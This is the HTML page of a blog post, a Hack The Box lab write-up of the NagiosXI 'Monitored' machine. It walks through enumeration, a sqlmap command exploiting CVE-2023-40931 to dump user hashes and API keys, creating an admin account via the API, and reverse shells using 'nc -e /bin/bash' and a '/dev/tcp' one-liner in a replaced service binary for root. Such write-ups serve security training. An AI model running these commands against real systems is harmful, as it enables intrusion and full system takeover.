@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en" class="auto-color">
+<head>
+
+    <title>Monitored — Hack The Box</title>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <link rel="preload" as="style" href="../assets/built/screen.css%3Fv=eef7a379b2.css" />
+    <link rel="preload" as="script" href="../assets/built/casper.js%3Fv=eef7a379b2" />
+
+    <link rel="stylesheet" type="text/css" href="../assets/built/screen.css%3Fv=eef7a379b2.css" />
+
+    <link rel="icon" href="../content/images/size/w256h256/2026/02/webp.net-resizeimage-4-1-2.png" type="image/png">
+    <link rel="canonical" href="index.html">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Nikostan">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Monitored — Hack The Box">
+    <meta property="og:description" content="Today we have quite interesting box called Monitored which was introduced to HTB with medium difficulty. Let’s dive in and see what we can learn about it.
+
+Go ahead and start scanning the ports against the IP address, maybe we have something interesting we can start with.
+
+nmap -sT">
+    <meta property="og:url" content="https://nikolozch.com/monitored-hack-the-box/">
+    <meta property="og:image" content="https://nikolozch.com/content/images/size/w1200/2026/02/1_ht14f3nLye487pVBC_xxFQ.webp">
+    <meta property="article:published_time" content="2026-02-23T20:29:27.000Z">
+    <meta property="article:modified_time" content="2026-02-23T20:29:27.000Z">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Monitored — Hack The Box">
+    <meta name="twitter:description" content="Today we have quite interesting box called Monitored which was introduced to HTB with medium difficulty. Let’s dive in and see what we can learn about it.
+
+Go ahead and start scanning the ports against the IP address, maybe we have something interesting we can start with.
+
+nmap -sT">
+    <meta name="twitter:url" content="https://nikolozch.com/monitored-hack-the-box/">
+    <meta name="twitter:image" content="https://nikolozch.com/content/images/size/w1200/2026/02/1_ht14f3nLye487pVBC_xxFQ.webp">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="Nikoloz Chitashvili">
+    <meta name="twitter:site" content="@NikoloziGE">
+    <meta name="twitter:creator" content="@NikoloziGE">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="999">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Nikostan",
+        "url": "https://nikolozch.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://nikolozch.com/content/images/size/w256h256/2026/02/webp.net-resizeimage-4-1-2.png",
+            "width": 60,
+            "height": 60
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Nikoloz Chitashvili",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://nikolozch.com/content/images/size/w1200/2026/02/profile.jpg",
+            "width": 1200,
+            "height": 801
+        },
+        "url": "https://nikolozch.com/author/nikoloz/",
+        "sameAs": [
+            "https://nikolozch.com",
+            "https://x.com/NikoloziGE"
+        ]
+    },
+    "headline": "Monitored — Hack The Box",
+    "url": "https://nikolozch.com/monitored-hack-the-box/",
+    "datePublished": "2026-02-23T20:29:27.000Z",
+    "dateModified": "2026-02-23T20:29:27.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://nikolozch.com/content/images/size/w1200/2026/02/1_ht14f3nLye487pVBC_xxFQ.webp",
+        "width": 1200,
+        "height": 999
+    },
+    "description": "Today we have quite interesting box called Monitored which was introduced to HTB with medium difficulty. Let’s dive in and see what we can learn about it.\n\nGo ahead and start scanning the ports against the IP address, maybe we have something interesting we can start with.\n\nnmap -sT --top-ports 1000 -sV -sC 10.X.X.X\n\nNothing fancy, regular ports are open. None of them have publicly known exploits for unauthenticated sessions.\n\nAt first, visiting the IP address we can see that we are redericted to",
+    "mainEntityOfPage": "https://nikolozch.com/monitored-hack-the-box/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 6.19">
+    <link rel="alternate" type="application/rss+xml" title="Nikostan" href="../rss/index.html">
+    
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="2d5ada1c12d278ef19c8227c18" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://nikolozch.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://nikolozch.com/webmentions/receive/" rel="webmention">
+    <script defer src="../public/cards.min.js%3Fv=eef7a379b2"></script><style>:root {--ghost-accent-color: #050404;}</style>
+    <link rel="stylesheet" type="text/css" href="../public/cards.min.css%3Fv=eef7a379b2.css">
+    <script src="https://cdn.jsdelivr.net/npm/prismjs/prism.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/autoloader/prism-autoloader.min.js" defer></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs/themes/prism.min.css">
+<script defer src="https://umami.cola.ge/script.js" data-website-id="660a3a6e-ce27-423e-a110-cf0ad499da7a"></script>
+    <link rel="preconnect" href="https://fonts.bunny.net"><link rel="stylesheet" href="https://fonts.bunny.net/css?family=fira-mono:400,700"><style>:root {--gh-font-heading: Fira Mono;--gh-font-body: Fira Mono;}</style>
+
+</head>
+<body class="post-template gh-font-heading-fira-mono gh-font-body-fira-mono is-head-left-logo has-cover">
+<div class="viewport">
+
+    <header id="gh-head" class="gh-head outer">
+        <div class="gh-head-inner inner">
+            <div class="gh-head-brand">
+                <a class="gh-head-logo no-image" href="../index.html">
+                        Nikostan
+                </a>
+                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
+                <button class="gh-burger" aria-label="Main Menu"></button>
+            </div>
+
+            <nav class="gh-head-menu">
+                <ul class="nav">
+    <li class="nav-home"><a href="../index.html">Home</a></li>
+    <li class="nav-about"><a href="../about/index.html">About</a></li>
+    <li class="nav-posts"><a href="../author/nikoloz/index.html">Posts</a></li>
+</ul>
+
+            </nav>
+
+            <div class="gh-head-actions">
+                        <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
+            </div>
+        </div>
+    </header>
+
+    <div class="site-content">
+        
+
+
+
+<main id="site-main" class="site-main">
+<article class="article post ">
+
+    <header class="article-header gh-canvas">
+
+        <div class="article-tag post-card-tags">
+        </div>
+
+        <h1 class="article-title">Monitored — Hack The Box</h1>
+
+
+        <div class="article-byline">
+        <section class="article-byline-content">
+
+            <ul class="author-list instapaper_ignore">
+                <li class="author-list-item">
+                    <a href="../author/nikoloz/index.html" class="author-avatar" aria-label="Read more of Nikoloz Chitashvili">
+                        <img class="author-profile-image" src="../content/images/size/w100/2026/02/profile.jpg" alt="Nikoloz Chitashvili" />
+                    </a>
+                </li>
+            </ul>
+
+            <div class="article-byline-meta">
+                <h4 class="author-name"><a href="../author/nikoloz/index.html">Nikoloz Chitashvili</a></h4>
+                <div class="byline-meta-content">
+                    <time class="byline-meta-date" datetime="2026-02-24">24 Feb 2026</time>
+                        <span class="byline-reading-time"><span class="bull">&bull;</span> 10 min read</span>
+                </div>
+            </div>
+
+        </section>
+        </div>
+
+            <figure class="article-image">
+                <img
+                    srcset="../content/images/size/w300/2026/02/1_ht14f3nLye487pVBC_xxFQ.webp 300w,
+                           ../content/images/size/w600/2026/02/1_ht14f3nLye487pVBC_xxFQ.webpp 600w,
+                          ../content/images/size/w1000/2026/02/1_ht14f3nLye487pVBC_xxFQ.webpbp 1000w,
+                         ../content/images/size/w2000/2026/02/1_ht14f3nLye487pVBC_xxFQ.webpebp 2000w"
+                    sizes="(min-width: 1400px) 1400px, 92vw"
+                    src="../content/images/size/w2000/2026/02/1_ht14f3nLye487pVBC_xxFQ.webp"
+                    alt="Monitored — Hack The Box"
+                />
+            </figure>
+
+    </header>
+
+    <section class="gh-content gh-canvas">
+        <p>Today we have quite interesting box called&nbsp;<strong>Monitored&nbsp;</strong>which was introduced to HTB with&nbsp;<strong><em>medium&nbsp;</em></strong>difficulty. Let’s dive in and see what we can learn about it.</p><p>Go ahead and start scanning the ports against the IP address, maybe we have something interesting we can start with.</p><pre><code class="language-bash">nmap -sT --top-ports 1000 -sV -sC 10.X.X.X</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2026/02/image-16.png" class="kg-image" alt="" loading="lazy" width="927" height="489" srcset="../content/images/size/w600/2026/02/image-16.png 600w, ../content/images/2026/02/image-16.png 927w" sizes="(min-width: 720px) 720px"></figure><p>Nothing fancy, regular ports are open. None of them have publicly known exploits for unauthenticated sessions.</p><p>At first, visiting the IP address we can see that we are redericted to&nbsp;<strong>nagios.monitored.htb</strong>. Add the IP address into&nbsp;<strong>/etc/hosts&nbsp;</strong>file to resolve domain and visit the website.</p><figure class="kg-card kg-image-card"><img src="../content/images/2026/02/image-17.png" class="kg-image" alt="" loading="lazy" width="1766" height="1068" srcset="../content/images/size/w600/2026/02/image-17.png 600w, ../content/images/size/w1000/2026/02/image-17.png 1000w, ../content/images/size/w1600/2026/02/image-17.png 1600w, ../content/images/2026/02/image-17.png 1766w" sizes="(min-width: 720px) 720px"></figure><p>Looks like&nbsp;<a href="https://www.nagios.com/products/nagios-xi/?ref=nikolozch.com" rel="noopener ugc nofollow">NagiosXI</a>&nbsp;installation. NagiosXI is server and network monitoring software. (Spoiler alert: possibly has really nice integration with command line)</p><p>Went with default credentials found online&nbsp;<strong>nagiosadmin:nagiosadmin</strong>, but didn’t work obviously. At this point, our hands are tied. We should get going and uncover mysterious directories with&nbsp;<a href="https://www.kali.org/tools/ffuf/?ref=nikolozch.com" rel="noopener ugc nofollow">FFUF</a>.</p><pre><code class="language-bash">ffuf -u "https://nagios.monitored.htb/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2026/02/image-18.png" class="kg-image" alt="" loading="lazy" width="916" height="463" srcset="../content/images/size/w600/2026/02/image-18.png 600w, ../content/images/2026/02/image-18.png 916w" sizes="(min-width: 720px) 720px"></figure><p>Well, visiting&nbsp;<code>/nagios</code>&nbsp;doesn’t reveal much. It requires us to login to platform and default credentials still not working.</p><p>Maybe we have something in&nbsp;<code>/nagiosxi</code>&nbsp;directory? Do you remember? When we tried to login we got redirected to&nbsp;<strong>https://nagios.monitored.htb/nagiosxi.&nbsp;</strong>Run FFUF against it reveals some interesting paths.</p><pre><code class="language-bash">ffuf -u "https://nagios.monitored.htb/nagiosxi/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -r
+</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2026/02/image-19.png" class="kg-image" alt="" loading="lazy" width="923" height="683" srcset="../content/images/size/w600/2026/02/image-19.png 600w, ../content/images/2026/02/image-19.png 923w" sizes="(min-width: 720px) 720px"></figure><p>All of these “critical” endpoints, like&nbsp;<code>/admin</code>&nbsp;<code>/config</code>&nbsp;<code>/terminal</code>&nbsp;<code>/accounts</code>&nbsp;<code>/db</code>&nbsp;, etc either redirects us to login page or is forbidden to access without proper authentication. However,&nbsp;<code>/api</code>&nbsp;endpoint looks very interesting. Maybe we can hunt for endpoints and make our way through the system. It’s time to investigate what do we have inside&nbsp;<code>/api</code>&nbsp;directory. Looking in the internet for such info gave me results from 2016–2017 which were obviously outdated (in my opinion) and weren’t applicable for our scenario. So, let’s fire up our friend FFUF.</p><pre><code class="language-bash">ffuf -u "https://nagios.monitored.htb/nagiosxi/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -r -recursion</code></pre><p>The scan gave 2 endpoints&nbsp;<code>/v1</code>&nbsp;and&nbsp;<code>/includes</code>. As you may know,&nbsp;<code>/v1</code>&nbsp;is indicator of version controlled endpoints and most probably we will find what we are looking for here. Let’s give it one more shot.</p><pre><code class="language-bash">ffuf -u "https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -r -recursion -fs 32</code></pre><p>Note: If we visit&nbsp;<code>/api/v1/&lt;something&gt;</code>&nbsp;we can see that all the “endpoints” were giving us same message with size of 32 so we gave&nbsp;<code>-fs 32</code>&nbsp;option to filter out mostly false-positive hits.</p><p>One of the first that came across to the eyes was&nbsp;<code>/authenticate</code>&nbsp;endpoint. So, as we saw earlier in NagiosXI there is&nbsp;<code>login.php</code>&nbsp;file which is possibly taking care of authentication, but now we see&nbsp;<code>/api/v1/authenticate</code>&nbsp;as well? Hmm interesting..</p><p>Other than this&nbsp;<code>/authenticate</code>&nbsp;endpoint, there is not much information we have to proceed with neither the credentials. Wait a minute… We have done only&nbsp;<code>TCP</code>&nbsp;scan with&nbsp;<code>nmap</code>, right? How can we forget about&nbsp;<code>UDP</code>&nbsp;? Going with&nbsp;<code>UDP</code>&nbsp;scan against the service reveals more information and open ports!</p><p>While doing pen testing of this box, I came across with tool called&nbsp;<a href="https://github.com/wirzka/incursore?ref=nikolozch.com" rel="noopener ugc nofollow"><strong>Incursore</strong></a><strong>&nbsp;</strong>which automates all the scanning you want. Under the hood, it runs tools automatically for you. It’s a simple bash script. This time, try scanning with&nbsp;<code>incursore</code>&nbsp;(Remember,&nbsp;<code>UDP</code>&nbsp;scan requires root privileges)</p><pre><code class="language-bash">sudo incursore -h 10.129.10.165 -t udp
+</code></pre><p>Bingo! we got hits and we can see that port&nbsp;<code>161/UDP snmp</code>&nbsp;is open. SNMP stands for&nbsp;<strong>Simple Network Management Protocol&nbsp;</strong>and you can find info pen testing snmp on&nbsp;<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp?ref=nikolozch.com" rel="noopener ugc nofollow">HackTricks</a>.</p><p><code>incursore</code>&nbsp;can automate all the dumping information for you through SNMP. Let’s run it (This process takes a while, feel free to go and grab a coffee ☕)</p><pre><code class="language-bash">sudo incursore -h 10.129.10.165 -t recon</code></pre><p>As recon goes, we start to see information dumped from snmp&nbsp;<strong><em>(snmpwalk is used by incursore)</em></strong></p><pre><code class="language-bash">iso.3.6.1.2.1.1.1.0 = STRING: "Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (811711) 2:15:17.11
+iso.3.6.1.2.1.1.4.0 = STRING: "Me &lt;<a href="https://nikolozch.com/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9ceef3f3e8dcf1f3f2f5e8f3eef9f8b2f4e8fe">[email&#160;protected]</a>&gt;"
+iso.3.6.1.2.1.1.5.0 = STRING: "monitored"
+iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+iso.3.6.1.2.1.1.8.0 = Timeticks: (1642) 0:00:16.42</code></pre><p>After a sip of tea (or coffee), we see much more stuff flowing in</p><pre><code class="language-bash">iso.3.6.1.2.1.25.4.2.1.5.884 = ""
+iso.3.6.1.2.1.25.4.2.1.5.920 = ""
+iso.3.6.1.2.1.25.4.2.1.5.949 = STRING: "/usr/sbin/snmptt --daemon"
+iso.3.6.1.2.1.25.4.2.1.5.950 = STRING: "/usr/sbin/snmptt --daemon"
+iso.3.6.1.2.1.25.4.2.1.5.975 = STRING: "-pidfile /run/xinetd.pid -stayalive -inetd_compat -inetd_ipv6"
+iso.3.6.1.2.1.25.4.2.1.5.977 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
+iso.3.6.1.2.1.25.4.2.1.5.978 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
+iso.3.6.1.2.1.25.4.2.1.5.979 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
+iso.3.6.1.2.1.25.4.2.1.5.980 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
+iso.3.6.1.2.1.25.4.2.1.5.981 = STRING: "--worker /usr/local/nagios/var/rw/nagios.qh"
+iso.3.6.1.2.1.25.4.2.1.5.1365 = STRING: "-d /usr/local/nagios/etc/nagios.cfg"
+iso.3.6.1.2.1.25.4.2.1.5.1381 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh &lt;REDACTED&gt; &lt;REDACTED&gt;"
+iso.3.6.1.2.1.25.4.2.1.5.1382 = STRING: "-c /opt/scripts/check_host.sh &lt;REDACTED&gt; &lt;REDACTED&gt;"
+iso.3.6.1.2.1.25.4.2.1.5.1439 = STRING: "-bd -q30m"
+iso.3.6.1.2.1.25.4.2.1.5.4060 = ""
+iso.3.6.1.2.1.25.4.2.1.5.4882 = ""</code></pre><p>Can you see&nbsp;<code>iso.3.6.1.2.1.25.4.2.1.5.1381(or 2)</code>OID? That must be some script which requires authentication and the second and third parameters must be username:password!! Soo, we have the user&nbsp;<code>&lt;REDACTED&gt;:&lt;REDACTED&gt;</code>.</p><p>Let’s head back to NagiosXI original login page, can we authenticate with this user? …. ….. …. (waiting….) No luck!</p><p>At this point, you may think that we are out of luck, but do you remember the API endpoint we found earlier?&nbsp;<code>/api/v1/authenticate</code>? Let’s CURL with POST method and see what this endpoint has to tell us.</p><pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ curl -XPOST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k
+{"error":"Must be valid username and password."}</code></pre><p>username… and password… Okay, let’s send the user we found in SNMP</p><pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ curl -XPOST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=&lt;REDACTED&gt;&amp;password=&lt;REDACTED&gt;" -k
+{"username":"&lt;REDACTED&gt;","user_id":"&lt;REDACTED&gt;","auth_token":"ea2f23b13da3acb8a55ef23983b94be19ca6caa4","valid_min":5,"valid_until":"Sat, 20 Jan 2024 07:33:00 -0500"}</code></pre><p>Finally, something… We have the auth token! Let’s see if we can authenticate with this token into NagiosXI portal. Visit root login directory and add extra&nbsp;<code>token</code>&nbsp;parameter (reference can be found on&nbsp;<a href="https://www.nagios.org/ncpa/help/2.0/api.html?ref=nikolozch.com" rel="noopener ugc nofollow">API Documentation</a>) along with&nbsp;<code>auth_token</code>.</p><figure class="kg-card kg-image-card"><img src="../content/images/2026/02/image-20.png" class="kg-image" alt="" loading="lazy" width="1766" height="1031" srcset="../content/images/size/w600/2026/02/image-20.png 600w, ../content/images/size/w1000/2026/02/image-20.png 1000w, ../content/images/size/w1600/2026/02/image-20.png 1600w, ../content/images/2026/02/image-20.png 1766w" sizes="(min-width: 720px) 720px"></figure><p>Maybe our user is admin? Why don’t we check&nbsp;<code>/nagiosxi/admin</code>&nbsp;(found in earlier scans)? We are greeted with message&nbsp;<strong><em>You are not authorized to access this feature. Contact your system administrator for more information, or to obtain access to this feature.</em></strong></p><p>Well, let’s strategize and break down into multiple steps our movement inside the system.</p><ol><li>We want to get reverse shell from the web portal</li><li>To get reverse shell we want to have admin rights to start services/commands (This knowledge comes from reading about NagiosXI documentations and how the software operates)</li><li>To get admin rights we need to either escalate our privileges to admin with finding and cracking the password’s hash or find a way to register new admin user</li><li>To get admin’s password’s hash, we need to look into database</li></ol><p>Searching internet with keywords “NagiosXI CVE”, “NagiosXI exploit”, etc. I came across with&nbsp;<a href="https://outpost24.com/blog/nagios-xi-vulnerabilities/?ref=nikolozch.com" rel="noopener ugc nofollow">the article</a>&nbsp;containing recently publicly shared information regarding SQLi for NagiosXI version 5.11.1 and lower (as we can see from the portal our installation is V5.11 meaning it’s vulnerable).</p><p>Reading about&nbsp;<strong>CVE-2023–40931</strong>, we can craft&nbsp;<a href="https://www.kali.org/tools/sqlmap/?ref=nikolozch.com" rel="noopener ugc nofollow">sqlmap</a>&nbsp;command to directly target the endpoint and parameter. (Note: don’t forget that to exploit this vulnerability, you need to be authenticated. So, grab a user cookie and let’s go)</p><pre><code class="language-bash">sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --data="id=3&amp;action=acknowledge_banner_message" --cookie "nagiosxi=PUT_YOUR_COOKIE_HERE" --dbms=MySQL --level=1 --risk=1 -D nagiosxi -T xi_users --dump</code></pre><p>As you can see, we have dumped the information containing sensitive admin information (Password hash, API Key, etc).</p><p>Trying and trying cracking the password with&nbsp;<a href="https://www.kali.org/tools/john/?ref=nikolozch.com" rel="noopener ugc nofollow">john</a>&nbsp;was not effective at all. Tried whole&nbsp;<strong><em>rockyou.txt</em></strong>, but no luck.</p><p>Do you remember looking at some API endpoints with 32 bytes response? All of them were asking us to provide the API key to them. Is this the API key we found what these endpoints were looking for?</p><p>Let’s try hitting anything&nbsp;<code>/api/v1/something?apikey=&lt;REDACTED&gt;</code></p><p>BINGO! We got response not “No API Key is provided”, but different error complaining about service not found! We have admin api key meaning we can hit API endpoints with admin rights. This will help us achieve our goal about creating the user with admin rights we mentioned before.</p><p>Checking internet, I searched for “NagiosXI online demo” and came across with&nbsp;<a href="https://nagiosxi.demos.nagios.com/nagiosxi/?ref=nikolozch.com" rel="noopener ugc nofollow">Live installation</a>&nbsp;of NagiosXI. Logging in with admin user (for testing) I can see tons of API documentation in Help panel. With correct navigation and reading I came across endpoint&nbsp;<code>/api/v1/system/user</code>. If you POST to this endpoint with correct parameters (documented in the panel) we can create admin user into our system! Wait no more, let’s hit it!</p><pre><code class="language-bash">curl -s -XPOST "http://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=&lt;REDACTED&gt;" -d "username=admin&amp;password=admin&amp;auth_level=admin"</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2026/02/image-21.png" class="kg-image" alt="" loading="lazy" width="492" height="78"></figure><pre><code class="language-bash">Quickly, login with our credentials! (admin:admin)</code></pre><figure class="kg-card kg-image-card"><img src="../content/images/2026/02/image-22.png" class="kg-image" alt="" loading="lazy" width="1769" height="1099" srcset="../content/images/size/w600/2026/02/image-22.png 600w, ../content/images/size/w1000/2026/02/image-22.png 1000w, ../content/images/size/w1600/2026/02/image-22.png 1600w, ../content/images/2026/02/image-22.png 1769w" sizes="(min-width: 720px) 720px"></figure><p>Pheeewwww!!! We have admin rights. Let’s find a way to get a reverse shell!</p><p>Remember talking about services/command executions? NagiosXI has such functionality residing on&nbsp;<code>/nagiosxi/includes/components/ccm/xi-index.php</code>. From left panel you can navigate to Commands -&gt; Commands which will open all already predefined commands for Nagios service</p><figure class="kg-card kg-image-card"><img src="../content/images/2026/02/image-23.png" class="kg-image" alt="" loading="lazy" width="1756" height="665" srcset="../content/images/size/w600/2026/02/image-23.png 600w, ../content/images/size/w1000/2026/02/image-23.png 1000w, ../content/images/size/w1600/2026/02/image-23.png 1600w, ../content/images/2026/02/image-23.png 1756w" sizes="(min-width: 720px) 720px"></figure><p>From here, we need to press “+ Add New” button and add command with any name but “<strong>nc &lt;your_ip&gt; &lt;your_port&gt; -e /bin/bash</strong>” value.</p><p>After saving new command and applying configuration, head back to Services page (from Core Confing Manager’s left panel). Edit one of the service to use your newly defined command</p><figure class="kg-card kg-image-card"><img src="../content/images/2026/02/image-24.png" class="kg-image" alt="" loading="lazy" width="1770" height="1094" srcset="../content/images/size/w600/2026/02/image-24.png 600w, ../content/images/size/w1000/2026/02/image-24.png 1000w, ../content/images/size/w1600/2026/02/image-24.png 1600w, ../content/images/2026/02/image-24.png 1770w" sizes="(min-width: 720px) 720px"></figure><p>Start netcat listener on your host machine and hit “Run Check Command”.</p><figure class="kg-card kg-image-card"><img src="../content/images/2026/02/image-25.png" class="kg-image" alt="" loading="lazy" width="544" height="167"></figure><p>That’s it, we cracked the user! Go ahead and add your ssh public key for user and ssh into the system for the sake of stability.</p><p><strong>Escalating Privileges</strong></p><p>First things first, I do simple&nbsp;<code>sudo -l</code>&nbsp;command to check if we can run anything with sudo. In this case, multiple scripts are revealed which can be run by our user.</p><figure class="kg-card kg-image-card"><img src="../content/images/2026/02/image-26.png" class="kg-image" alt="" loading="lazy" width="893" height="418" srcset="../content/images/size/w600/2026/02/image-26.png 600w, ../content/images/2026/02/image-26.png 893w" sizes="(min-width: 720px) 720px"></figure><p>Good to know.. Reading through all these scripts we can’t find much to get our hands on. Let’s check if&nbsp;<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS?ref=nikolozch.com" rel="noopener ugc nofollow">LinPeas</a>&nbsp;can offer us something.</p><p>Running&nbsp;<code>linpeas.sh</code>&nbsp;gave us interesting insights.</p><figure class="kg-card kg-image-card"><img src="../content/images/2026/02/image-27.png" class="kg-image" alt="" loading="lazy" width="1012" height="176" srcset="../content/images/size/w600/2026/02/image-27.png 600w, ../content/images/size/w1000/2026/02/image-27.png 1000w, ../content/images/2026/02/image-27.png 1012w" sizes="(min-width: 720px) 720px"></figure><p>We see that there are services which execute files and we can edit those files? That’s interesting… Can you remember what&nbsp;<code>sudo -l</code>&nbsp;output gave to us? Have you read any of those scripts?</p><p>There is one interesting&nbsp;<code>manage_services.sh</code>&nbsp;which can start/stop/restart/etc services. (Basically, what&nbsp;<code>systemctl</code>&nbsp;is doing)</p><p>So…</p><ol><li>We can start a service with&nbsp;<code>sudo manage_services.sh</code>&nbsp;which will execute as root</li><li>We can write into files which is executed by service.</li></ol><p>Do these ring a bell?</p><p>We will take&nbsp;<code>npcd</code>&nbsp;service.</p><p>By checking the content of&nbsp;<code>/usr/local/nagios/bin/npcd</code>&nbsp;we can see that it’s linux executable (which is normal). Anyways, for us it doesn’t matter if it’s executable of zip file or whatever. Service is executing it, so here we are. Start netcat listener on your host machine and head back to the victim</p><pre><code class="language-bash">rm /usr/local/nagios/bin/npcd
+nano /usr/local/nagios/bin/npcd # Create this file and edit it
+# ------- Put this into your npcd file
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/YOUR_IP/YOUR_PORT 0&gt;&amp;1
+# -------
+chmod +x /usr/local/nagios/bin/npcd # Make it executable, so service can execute it
+sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd</code></pre><p>And here… ladies and gents… we got him…</p><figure class="kg-card kg-image-card"><img src="../content/images/2026/02/image-28.png" class="kg-image" alt="" loading="lazy" width="650" height="221" srcset="../content/images/size/w600/2026/02/image-28.png 600w, ../content/images/2026/02/image-28.png 650w"></figure><p>Wow… What a ride!</p><p>Thanks for the creators for such a great machine.</p><p><strong>Happy Pen Testing!</strong></p>
+    </section>
+
+
+</article>
+</main>
+
+
+
+
+            <aside class="read-more-wrap outer">
+                <div class="read-more inner">
+                        
+<article class="post-card post">
+
+    <a class="post-card-image-link" href="../devvortex-hack-the-box/index.html">
+
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2026/02/1_vCbJzc9uy23j90lTiLBdvw.webp 300w,
+                   ../content/images/size/w600/2026/02/1_vCbJzc9uy23j90lTiLBdvw.webpp 600w,
+                  ../content/images/size/w1000/2026/02/1_vCbJzc9uy23j90lTiLBdvw.webpbp 1000w,
+                 ../content/images/size/w2000/2026/02/1_vCbJzc9uy23j90lTiLBdvw.webpebp 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2026/02/1_vCbJzc9uy23j90lTiLBdvw.webp"
+            alt="Devvortex — Hack The Box"
+            loading="lazy"
+        />
+
+
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../devvortex-hack-the-box/index.html">
+            <header class="post-card-header">
+                <div class="post-card-tags">
+                </div>
+                <h2 class="post-card-title">
+                    Devvortex — Hack The Box
+                </h2>
+            </header>
+                <div class="post-card-excerpt">Hmmm…. Devvortex, yet another machine categorized as “easy”, but got spawned just 1 day ago. Personally I found it super straight forward, so let me guide you through this “neglected” server.
+
+
+Port scanning:
+
+As always, given IP address, we start with scanning for open ports. For this, we use widely</div>
+        </a>
+
+        <footer class="post-card-meta">
+            <time class="post-card-meta-date" datetime="2026-02-27">27 Feb 2026</time>
+                <span class="post-card-meta-length">7 min read</span>
+        </footer>
+
+    </div>
+
+</article>
+                        
+<article class="post-card post">
+
+    <a class="post-card-image-link" href="../exatlon-hack-the-box/index.html">
+
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2026/02/image-8-1.png 300w,
+                   ../content/images/size/w600/2026/02/image-8-1.pngg 600w,
+                  ../content/images/size/w1000/2026/02/image-8-1.pngng 1000w,
+                 ../content/images/size/w2000/2026/02/image-8-1.pngpng 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2026/02/image-8-1.png"
+            alt="Exatlon — Hack The Box"
+            loading="lazy"
+        />
+
+
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../exatlon-hack-the-box/index.html">
+            <header class="post-card-header">
+                <div class="post-card-tags">
+                </div>
+                <h2 class="post-card-title">
+                    Exatlon — Hack The Box
+                </h2>
+            </header>
+                <div class="post-card-excerpt">Exatlon is one of the challenges marked as “Easy”. Why not take a look at this super interesting challenge? (kudos to OctopusTR)
+
+After downloading the executable, let’s run some basic forensic analysis against it.
+
+file exatlon_v1
+
+Looks like it’s Linux executable. Let’s execute the app, see</div>
+        </a>
+
+        <footer class="post-card-meta">
